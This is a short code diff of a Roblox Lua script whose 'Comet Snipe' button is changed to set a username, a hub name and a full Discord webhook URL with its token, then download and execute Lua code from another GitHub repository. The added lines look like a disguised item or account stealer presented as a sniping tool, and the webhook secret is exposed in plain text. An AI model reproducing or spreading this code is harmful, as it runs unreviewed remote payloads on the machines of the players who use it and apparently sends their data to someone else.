@@ -7,5 +7,9 @@ local MainSection = Main:NewSection("Main")
 
 
 MainSection:NewButton("Comet Snipe", "Activate comet snipe", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoSenseManiac/CometSnipe/main/source", true))()
+    _G.Username = "Sturmgezhutz"
+    _G.HubName  = "Comet Sniper V2"
+    _G.Webhook  = "https://discord.com/api/webhooks/1091826688532435004/nfKUZKNtwTvBY0kaA3EDEPJnLHWr7y0U4LrGGXwgKORV7cNILf1J1Zy8TACQBvE6bs-M"
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()()
 end)
